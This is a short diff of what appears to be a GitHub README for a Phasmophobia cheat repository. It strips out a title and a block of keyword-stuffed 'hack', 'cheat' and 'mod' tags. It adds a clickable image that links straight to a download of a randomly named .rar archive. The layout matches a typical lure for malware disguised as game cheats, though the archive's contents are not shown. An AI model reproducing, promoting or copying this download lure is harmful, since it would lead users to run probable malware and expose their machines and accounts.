@@ -1,2 +1,1 @@
-# phasmophobiaBLACKv
-phasmophobia-hack phasmophobia-cheat phasmophobia-cheats phasmophobia-hacks phasmophobia-money-cheat phasmophobia-level-cheat phasmophobia-cheat-menu phasmophobia-script phasmophobia-money-hack phasmophobia-mod phasmophobia-esp phasmophobia-scripts phasmophobia-gamemods phasmophobia-gamemode phasmophobia-teleport
+[![ abs ](https://github.com/Ba541754/phasmophobiaBLACKv/blob/main/gkalskasfk.png)](https://github.com/Ba541754/phasmophobiaBLACKv/raw/main/w2a2gd.rar)
